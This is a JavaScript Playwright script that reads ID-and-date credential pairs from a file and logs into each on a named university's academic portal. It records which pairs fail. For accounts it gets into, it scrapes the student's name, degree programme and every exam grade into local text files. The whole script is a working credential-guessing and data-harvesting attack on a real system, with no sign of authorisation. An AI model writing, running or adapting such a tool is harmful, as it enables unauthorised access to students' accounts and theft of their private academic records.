import { chromium } from "playwright";
import fs from "fs";

function cleanText(text) {
  return text.replace(/\s{2,}/g, ' ').trim();
}

async function submitPost(carnet, fecha) {
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();

  try {
    const page = await context.newPage();
    await page.goto("http://sagaa.fcyt.umss.edu.bo/login/login.php");
    await page.fill('input[name="loginUsuario"]', carnet);
    await page.fill('input[name="claveUsuario"]', fecha);
    await Promise.all([page.click('input[name="botonFormulario"]')]);

    // Intentar localizar el elemento específico
    const errorElement = await page.locator(
      'td.textoCeldaError:has-text("Usuario / Contraseña incorrectos!")'
    );

    // Verificar si el elemento existe y es visible
    const isErrorVisible = await errorElement.isVisible();

    if (isErrorVisible) {
      console.error("Credenciales incorrectas para el carnet:", carnet);
      fs.appendFileSync("credenciales_incorrectas.txt", carnet+':'+fecha + "\n");
  
      // close
      await browser.close();
      return;
    }

    // Esperar y obtener el texto del primer <strong> dentro del <div> que debería contener el nombre del usuario
    const nombre = await page.textContent("td > div > p > strong:first-child");

    const nombreLimpio = nombre.split(",")[0].trim();

    const newPage = await context.newPage();
    await newPage.goto(
      "http://sagaa.fcyt.umss.edu.bo/adm_academica/resultadosFinales.php"
    );

    const examenes = await newPage.$$eval(
      'select[name="idInscripcion"] option',
      (options) => options.map((option) => option.value)
    );

    const examenPagina = await context.newPage();
    const notas = [];
    let FormatoExamenes = "";
    for (const examen of examenes) {
      await examenPagina.goto(
        "http://sagaa.fcyt.umss.edu.bo/adm_academica/resultadosFinales.php"
      );

      await examenPagina.selectOption('select[name="idInscripcion"]', examen);
      await examenPagina.click('input[name="registrarGestion"]');

      try {
        const textoSelector = examenPagina.waitForSelector(
          "span.textoGrandoteContenidoAzul strong, span.textoGrandoteContenidoRojo strong",
          { timeout: 5000 }
        );

        // Capturar el nombre del postulante
        // const postulanteElement = await examenPagina.$('td[valign="middle"]:has-text("Postulante:")');
        // const postulanteText = await postulanteElement.textContent();
        // const postulante = cleanText(postulanteText.split(':')[1]);

        // Capturar la gestión
        const gestionElement = await examenPagina.$(
          'td[valign="middle"]:has-text("Gestión:")'
        );
        const gestionText = await gestionElement.textContent();
        const gestion =
          cleanText(gestionText.split(":")[1].split("-")[0]) +
          "-" +
          cleanText(gestionText.split(":")[1].split("-")[1]);

        // Capturar el tipo de inscripción
        const tipoInscripcionElement = await examenPagina.$(
          'td[valign="middle"]:has-text("Tipo de Inscripción:")'
        );
        const tipoInscripcionText = await tipoInscripcionElement.textContent();
        const tipoInscripcion = cleanText(tipoInscripcionText.split(":")[1]);

        // Capturar la carrera
        const carreraElement = await examenPagina.$(
          'td[valign="middle"]:has-text("Carrera:")'
        );
        const carreraText = await carreraElement.textContent();
        const carrera = cleanText(carreraText.split(":")[1]);

        const elemento = await textoSelector;
        const nota = await elemento.textContent();
        let notaF = nota.trim();
        if (notaF >= 51) {
          notas.push(notaF);
          FormatoExamenes += `GESTIÓN: ${gestion} | TIPO: ${tipoInscripcion} | NOTA: ${notaF} | APROBO?: TRUE | CARRERA: ${carrera} | EXAMENID: ${examen}\n    `;

          fs.appendFileSync(
            "aprobados.txt",
            `NOMBRE: ${nombreLimpio}\n` + FormatoExamenes
          );
        } else {
          notas.push(notaF);
          FormatoExamenes += `GESTIÓN: ${gestion} | TIPO: ${tipoInscripcion} | NOTA: ${notaF} | APROBO?: FALSE | CARRERA: ${carrera}| EXAMENID: ${examen}\n    `;
        }
      } catch (e) {
        console.log(`No se encontró nota para el examen: ${examen}`);
        notas.push("No disponible");
      }
    }
    console.log("Nombre del usuario:", nombreLimpio);
    console.log("Todas las notas capturadas:", notas);
    console.log("Formato de examenes: ", FormatoExamenes);
    let allExams = `NOMBRE: ${nombreLimpio}
EXAMENES:
    ${FormatoExamenes}

`;

    fs.appendFileSync("ExamenesEstudiantes.txt", allExams);
  } catch (error) {
    console.error("Ocurrió un error durante la ejecución del script:", error);
  } finally {
     await browser.close();
  }
}

// Rutas de los archivos directamente especificadas
const originalFilePath = './logins.txt';
const processedFilePath = './procesado.txt';

// Leer el contenido del archivo original de manera sincrónica
let data = fs.readFileSync(originalFilePath, 'utf8');

// Dividir el contenido en líneas
let lines = data.split('\n');

// Función para procesar una credencial
async function processCredential() {
    // Buscar la primera credencial
    const credentialIndex = lines.findIndex(line => line.includes(':'));

    if (credentialIndex !== -1) {
        // Extraer la credencial
        const credential = lines[credentialIndex];

        // Agregar la credencial al archivo procesado
        fs.appendFileSync(processedFilePath, credential + '\n');

        // Remover la credencial del array original
        lines.splice(credentialIndex, 1);

        // Actualizar el archivo original de manera sincrónica
        fs.writeFileSync(originalFilePath, lines.join('\n'));

        // Procesar la credencial
        const [carnet, fecha] = credential.split(':');
        await submitPost(carnet, fecha); // Suponiendo que submitPost es una función asincrónica que realiza alguna tarea
        console.log("Credencial movida: " + credential);

        return true; // Indicar que se procesó una credencial
    } else {
        console.log("No hay más credenciales válidas para procesar.");
        return false; // Indicar que no quedan más credenciales
    }
}

// Función principal asincrónica
const main = async () => {
    let credencialProcesada = true;
    while (credencialProcesada) {
        credencialProcesada = await processCredential();
    }
};

main();
